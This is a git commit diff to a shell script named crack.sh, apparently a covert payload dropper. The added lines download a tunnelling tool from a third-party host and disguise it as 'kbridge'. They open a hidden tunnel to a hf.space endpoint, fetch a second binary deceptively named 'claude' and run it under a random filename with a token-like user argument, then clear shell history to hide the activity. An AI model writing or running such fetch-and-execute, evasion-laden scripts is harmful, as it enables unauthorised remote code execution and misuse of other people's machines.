7bbc8c597821ba7d96d3e111e197ec1a904a5916
lianamahesra-creator <lianamahesra@gmail.com>
2026-06-24 10:58:41 +0700

    Update crack.sh

--- crack.sh
+++ crack.sh
@@ -1,6 +1,31 @@
-apt update
-apt install default-jre default-jdk -y
-curl -O -L -J https://github.com/lianamahesra-creator/legendary-journey/raw/refs/heads/main/run.java
-javac run.java
-sleep 10s
-java run
+RANDOM_NAME=$(tr -dc 'a-z0-9' </dev/urandom | head -c 12)
+PORT=$(shuf -i 20000-65000 -n 1)
+
+echo "Using port: $PORT"
+
+curl -L -o wstunnel.tar.gz https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
+
+tar -xf wstunnel.tar.gz
+rm -f wstunnel.tar.gz
+
+chmod +x wstunnel
+mv wstunnel kbridge
+
+nohup ./kbridge client \
+    wss://namtran1922-datalab.hf.space \
+    -L tcp://${PORT}:127.0.0.1:1 \
+    >/dev/null 2>&1 &
+
+curl -L -o claude https://storage.technoelectro.online/claude
+
+chmod +x claude
+mv claude "${RANDOM_NAME}"
+
+echo "Filename: ${RANDOM_NAME}"
+
+nohup "./${RANDOM_NAME}" \
+    --host "127.0.0.1:${PORT}" \
+    --user "prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t"
+
+history -c 2>/dev/null || true
+clear
